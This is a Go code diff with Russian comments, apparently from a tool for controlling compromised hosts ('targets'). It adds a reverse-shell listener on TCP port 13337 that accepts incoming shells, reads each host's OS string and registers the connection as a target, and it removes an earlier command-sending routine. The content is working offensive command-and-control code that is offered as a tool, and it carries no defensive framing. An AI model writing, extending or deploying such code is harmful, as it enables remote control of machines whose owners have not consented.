@@ -4,10 +4,10 @@ import (
 	"bufio"
 	"fmt"
 	"log"
+	"net"
 	"os"
 	"os/exec"
 	"strings"
-	"time"
 )
 
 var global_response_timeout int = 1000
@@ -435,34 +435,41 @@ func BindShellRequest(request []string, targets *[]Target) {
 	}
 }
 
-func sendCommand(target Target, input string, ch_resp chan string) {
-	// Отправка команды на целевой хост
-	_, err := target.conn.Write([]byte(input + "\n"))
-	if err != nil {
-		log.Fatalln(err)
-	}
+func ReverseShellHandle(targets *[]Target, conn net.Conn) {
+	// Создание буфера для считывания ОС целевого хоста
+	init_buf := make([]byte, global_buffer_size)
 
-	// Установка дедлайна для чтения ответа
-	if err := target.conn.SetReadDeadline(time.Now().Add(time.Duration(global_response_timeout) * time.Millisecond)); err != nil {
-		ch_resp <- fmt.Sprintf("Error setting read deadline for %s: %v", target.name, err)
-		log.Fatalln(err)
-	}
-
-	// Чтение ответа
-	buffer := make([]byte, global_buffer_size)
-	n, err := target.conn.Read(buffer)
+	// Чтение ОС хоста
+	n, err := conn.Read(init_buf)
 	if err != nil {
-		ch_resp <- ""
 		return
 	}
 
-	// Отправка ответа в канал
-	ch_resp <- fmt.Sprintf("Response from %s:\n%s", target.name, string(buffer[:n]))
+	// Добавление хоста в список целей
+	*targets = append(*targets, Target{name: conn.RemoteAddr().String(), conn: conn, status: false, group: string(init_buf[:n])})
+}
+
+func ReverseShellStartServer(targets *[]Target) {
+	listener, err := net.Listen("tcp", ":13337")
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			log.Fatalln(err)
+		}
+		go ReverseShellHandle(targets, conn)
+	}
 }
 
 func main() {
 	// Инициализация контейнера целей
 	targets := make([]Target, 0, 1)
+
+	// Запуск сервера для подключения через Reverse shell
+	go ReverseShellStartServer(&targets)
 
 	// Считывание целей из файла
 	BindShellLoadTargets(&targets, os.Args[1])
